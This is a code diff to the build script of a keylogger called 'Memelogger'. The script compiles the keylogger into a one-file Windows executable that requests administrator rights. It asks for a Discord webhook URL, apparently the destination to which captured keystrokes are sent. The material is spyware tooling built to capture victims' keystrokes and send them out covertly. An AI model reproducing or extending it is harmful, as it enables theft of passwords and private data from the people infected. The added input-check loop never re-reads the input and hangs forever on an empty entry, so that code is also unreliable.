@@ -18,13 +18,15 @@ def build():
     try:
         subprocess.run(
             [
+                "python",
+                "-m",
                 "pyinstaller",
                 "--onefile",
                 "--disable-windowed-traceback",
                 "--uac-admin",
                 "-n",
                 "Memelogger",
-                f"--icon={os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon","icon.ico")}",
+                f"--icon={os.path.join(os.path.dirname(os.path.abspath(__file__)), 'icon', 'icon.ico')}",
                 "--distpath",
                 output_dir,
                 "--workpath",
@@ -99,6 +101,8 @@ def main():
             continue
         if choice == 1:
             url = input("\nEnter discord webhook url: ")
+            while url.strip() == "":
+                continue
             discord_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "keylogger.py")
             python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
             with open(discord_file, "r", encoding="utf-8") as f:
